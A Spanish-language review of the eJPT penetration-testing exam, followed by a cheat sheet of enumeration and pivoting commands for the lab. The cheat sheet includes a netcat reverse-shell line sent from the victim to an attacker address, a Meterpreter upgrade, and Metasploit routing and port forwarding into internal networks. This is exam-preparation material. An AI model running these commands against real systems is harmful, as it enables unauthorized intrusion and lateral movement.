## ¿Cómo es el examen?

El eJPT es un examen práctico compuesto por 35 preguntas tipo test que deben resolverse en un plazo de 48 horas. Se desarrolla desde una máquina Kali Linux accesible mediante el navegador a través de Guacamole; esta máquina no tiene acceso a internet, aunque realmente no es necesario para completarlo. El laboratorio incluye más de cinco hosts, algunos de ellos ubicados en una red interna, por lo que será necesario realizar pivoting para alcanzarlos. En este punto, recomiendo utilizar Metasploit, ya que facilita considerablemente el proceso de movimiento lateral dentro del entorno del examen.

## Motivo de sacarme el examen

Decidí rendir el eJPT principalmente para poner a prueba mi nivel real. Antes de presentarlo, ya había resuelto más de 90 máquinas en Hack The Box; sin embargo, aún sentía que mi nivel estaba por debajo de alguien que contara con esta certificación. Por ello, mi objetivo no era solo obtener el certificado, sino medir de manera objetiva mis conocimientos y mi metodología.
Después de completar el examen, entendí que mi nivel no era tan bajo como pensaba. Más que una validación externa, el eJPT terminó siendo una validación personal sobre mis fundamentos técnicos.

## Impresiones del examen

Desarrollé el examen en aproximadamente 18 horas, distribuidas en distintos momentos, ya que hice pausas para comer y descansar. En esencia, el examen evalúa si tienes una metodología sólida al momento de realizar reconocimiento y enumeración. La mayoría de vulnerabilidades se descubren identificando correctamente qué servicios están corriendo, sus versiones, los puertos expuestos y las vulnerabilidades comunes asociadas. Además, es fundamental saber interactuar con servicios como FTP, SMB, SSH, HTTP o HTTPS y comprender qué información útil puede extraerse de cada uno.

Uno de los aspectos que más me gustó fue la parte de pivoting, ya que me obligó a profundizar en el uso de Metasploit; anteriormente estaba más acostumbrado a realizar este proceso con Chisel. No obstante, en términos generales, el examen me pareció bastante orientado a estilo CTF, con vulnerabilidades muy evidentes y escenarios poco realistas si los comparamos con auditorías reales.

Además, el examen abusa considerablemente del concepto de fuerza bruta, algo que, desde mi perspectiva, es poco realista debido al nivel de ruido que este tipo de ataques genera en entornos reales. También noté que en varias preguntas se ofrecen pistas bastante directas; por ejemplo, cuando se pregunta por la contraseña de un usuario específico y se proporcionan cuatro posibles opciones, ya se está validando indirectamente el usuario. Finalmente, me hubiera parecido más profesional poder utilizar mi propio entorno de trabajo y conectarme mediante VPN, en lugar de depender exclusivamente de una máquina accesible desde el navegador.

## Conocimientos que debes dominar antes de rendirlo

Si quieres aprobar el eJPT con seguridad, no necesitas conocimientos avanzados, pero sí debes tener bases sólidas en networking, enumeración y explotación básica. El examen no premia la creatividad extrema, sino la correcta aplicación de fundamentos técnicos.

# Cheat Sheet

## Networking básico

Antes de hablar de explotación, debes entender qué estás atacando.

Debes dominar:

- Modelo TCP/IP

- Puertos comunes

- Subnetting básico

- Comunicación cliente-servidor

- Diferencia entre TCP y UDP

**Comandos** 
```bash 
# Ver interfaces de red
ip a

# Comprobar conectividad
ping <TARGET_IP>

# Descubrir hosts en red local
arp-scan -I ens33 --localnet --ignoredups

# Conectarse manualmente a servicios
nc -v <HOST> <PORT>
openssl s_client -connect <HOST>:<PORT>

# Ver conexiones locales
netstat -nat
ss -nltp
```

## Enumeración (LA PARTE MÁS IMPORTANTE)

El examen se basa principalmente en enumerar correctamente. Si no sabes enumerar, no avanzas.

**Nmap**

```bash 
# Escaneo completo TCP
nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn <TARGET_IP> -oG allPorts

# Escaneo UDP
nmap -p- -sU --open --min-rate 10000 -vvv -n <TARGET_IP> -oN udp_allPorts

# Escaneo detallado de puertos específicos
nmap -p22,80,443 -sCV <TARGET_IP> -oN targeted
```

**SMB**
Enumeración sin credenciales y con credenciales.

```bash
# CrackMapExec
crackmapexec smb <TARGET_IP>
crackmapexec smb <TARGET_IP> --shares
crackmapexec smb <TARGET_IP> -u usuario -p password --shares
crackmapexec smb <TARGET_IP> -u usuario -p password --users
```

```bash
# smbclient
smbclient -L //<TARGET_IP> -N
smbclient -L //<TARGET_IP> -U usuario
smbclient //<TARGET_IP>/share -U usuario
```

```bash 
# smbmap
smbmap -H <TARGET_IP>
smbmap -H <TARGET_IP> -u usuario -p password
smbmap -H <TARGET_IP> -u usuario -p password -r
```

## Pivoting con Metasploit

**Descubrimiento de hosts (Bash)**

Script para identificar hosts activos en la red interna:
```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo..."
  tput cnorm; exit 1
}

tput civis
trap ctrl_c SIGINT

for i in $(seq 1 254); do
  timeout 1 bash -c "ping -c 1 -W 1 192.168.18.$i &>/dev/null && echo '[+] Host activo: 192.168.18.$i'" &
done

wait
tput cnorm
```

**Requisitos para Pivoting**

- Tener acceso a la **máquina víctima**
- Contar con una **shell tipo Meterpreter**
- Metasploit Framework operativo en la máquina atacante

**Listener en Metasploit**

Nos ponemos en escucha para recibir la shell reversa:

```bash
msfconsole

use multi/handler
set LHOST <tu-ip>
set LPORT <tu-puerto>
run
```
> El payload se deja por defecto en `shell_reverse_tcp`

**En la máquina víctima**

Enviar una shell reversa al listener:
```bash
nc 10.0.2.100 443 -e /bin/bash
```

Una vez recibida:
- Mandar la shell al **background** con `Ctrl + Z`
- Verificar la sesión creada:

```bash 
sessions
```

**Upgradear shell a Meterpreter**

Convertimos la shell normal en una sesión Meterpreter:

```python
use shell_to_meterpreter
set LHOST 10.0.2.100
set LPORT 443
set SESSION 1     # el 1 es el ID de la session con la shell tcp
run

#Esto creará una nueva sesión Meterpreter
sessions -i 2
```

## Pivoting – Enrutamiento (Routing)

<br>

**Añadir ruta manualmente**

```bash
route add 192.168.100.0/24 2
```
- `192.168.100.0/24` → Red objetivo
- `2` → ID de la sesión Meterpreter

```bash
#Listar rutas
route

#Eliminar ruta
route del 192.168.100.0/24 2
```
### Autoroute (Automático)

Añadir rutas automáticamente desde la sesión Meterpreter:

```python
use multi/manage/autoroute
set SESSION 2
run

#Verificar
route
```
<br>

**Escaneo de puertos vía Pivoting**

```python
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.21
run
```
<br>

**Port Forwarding con Meterpreter**

Conectarse a la sesión Meterpreter:
```bash 
sessions -i 2
```

Crear redirección de Puertos
```bash
portfwd add -l 8080 -p 80 -r 192.168.100.21
```
- `-l` puerto local
- `-p` puerto remoto
- `-r` host remoto

Listar redirecciones
```bash
portfwd
```

Acceso desde el navegador
```python
http://localhost:8080
``` 
> Permite acceder al **puerto 80** de la máquina interna `192.168.100.21`
